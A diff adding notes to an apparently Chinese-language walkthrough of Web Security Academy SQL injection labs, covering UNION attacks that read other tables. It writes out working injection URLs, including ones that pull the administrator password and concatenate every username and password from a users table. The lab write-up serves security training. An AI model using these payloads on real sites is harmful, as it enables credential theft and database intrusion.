@@ -66,3 +66,15 @@
 > 确定回显点为第二列之后，就可以在回显处完成输出`7ix1eZ`。
 
 `https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,%277ix1eZ%27,%273%27--+`
+
+## 9: SQL injection UNION attack, retrieving data from other tables
+
+> 跟第5个lab几乎一致。
+
+## 10: SQL injection UNION attack, retrieving multiple values in a single column
+
+> 这个题与之前获取用户名密码的不一样在于，它只有一个回显点，所以我们不能直接同时获取到所有的用户名与密码。
+
+如果我们只想要获取`administrator`账户的密码，我们只需要利用`where`添加一个条件即可，`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,password+from+users+where+username=%27administrator%27--+`。
+
+但这题的本意是使用拼接，将用户名和密码作为一个column回显，这样我们就可以得到所有的用户名和密码，`https://xxxxxxx.web-security-academy.net/filter?category=ABC%27+union+select+%271%27,username||%27|%27||password+from+users--+`，我们可以得到只用`|`拼接用户名和密码的字段。这里需要注意我们不可以使用`&`进行拼接，因为`&`在URL用于连接不同参数。
